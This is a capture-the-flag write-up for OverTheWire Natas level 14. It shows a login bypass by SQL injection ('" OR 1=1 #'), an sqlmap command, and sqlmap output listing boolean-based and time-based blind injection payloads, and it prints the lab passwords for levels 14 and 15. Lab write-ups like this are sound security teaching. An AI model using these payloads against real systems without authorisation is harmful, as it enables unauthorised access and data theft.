# Write up

To login in the domain `http://natas14.natas.labs.overthewire.org` use credentials:

Username: `natas14`<br/>
Password: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`

This level introduces basic SQL injection attacks. By examining the source code, we can easily identify that the server is susceptible to a Boolean Bases SQLi. By sending as username the value `" OR 1=1 #` and an empty password, the following MySQL query will be executed:

```sql
SELECT * from users where username="" OR 1=1 #and password="";
```

which always returns all rows from the `users` table. Thus by submitting the above output we successfully retrieve the password for level15, which is `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`

So to login in the level15 use the credentials:

Username: `natas15`<br/>
Password: `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`

## Method2 - Using [sqlmap](https://github.com/sqlmapproject/sqlmap)

Using the method of [arbitrary injection points](https://github.com/sqlmapproject/sqlmap/wiki/Usage#arbitrary-injection-point) in conjunction with the [request file flag (`-r`)](https://github.com/sqlmapproject/sqlmap/wiki/Usage#load-http-request-from-a-file), we can instruct sqlmap to try and find SQL injection vulnerabilities in the input fields `username` and `password` that are present in the web page. The command `sqlmap -r ./sqlmap-request-file.http --string "Successful login!" -v 2` correctly identifies vulnerabilities in both fields:

```txt
sqlmap identified the following injection point(s) with a total of 444 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: username=-9136" OR 6076=6076#&password=
    Vector: OR [INFERENCE]#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=" AND (SELECT 2885 FROM (SELECT(SLEEP(5)))GlHn)-- dSpZ&password=
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

Parameter: #2* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: username=&password=-2288" OR 4949=4949#
    Vector: OR [INFERENCE]#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=&password=" AND (SELECT 2946 FROM (SELECT(SLEEP(5)))EgtM)-- ZZDk
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
```
